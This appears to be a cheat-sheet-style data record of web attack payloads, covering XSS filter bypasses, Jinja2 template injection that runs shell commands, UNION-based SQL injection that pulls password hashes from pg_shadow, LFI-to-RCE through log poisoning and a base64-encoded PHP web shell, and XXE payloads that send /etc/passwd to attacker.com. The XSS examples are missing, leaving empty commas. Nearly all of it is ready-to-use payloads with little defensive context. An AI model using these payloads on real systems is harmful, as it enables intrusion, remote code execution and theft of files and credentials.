content: Basic XSS payloads for detection and exploitation. Alert-based: , , . Bypass filters: Use encoding, event handlers, SVG/Math tags.

Jinja2 SSTI RCE payloads for Python applications. Basic RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. Alternative: {{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}. Detection payload: {{7*7}}, {{config}}. Works on Flask, Django (with Jinja2).

SQL injection UNION-based data extraction. MySQL: ' UNION SELECT 1,2,3,4,database()-- -, ' UNION SELECT null,table_name,null FROM information_schema.tables-- -. PostgreSQL: ' UNION SELECT NULL,usename,passwd FROM pg_shadow-- -. Column enumeration: ORDER BY n--, UNION SELECT NULL,NULL,...-- -. Adjust null count to match column count.

LFI to RCE via log poisoning and wrapper abuse. Log poisoning: Inject PHP in User-Agent, access /var/log/apache2/access.log. PHP wrapper: php://filter/convert.base64-encode/resource=index.php. Data wrapper: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=. proc/self/environ injection. Requires file inclusion vulnerability.

XXE out-of-band data exfiltration payloads. Evil DTD: <!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://attacker.com/?x=%file;'>">%eval;%exfil;. Main XML: <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'>%xxe;]>. Use for blind XXE when direct file read blocked.
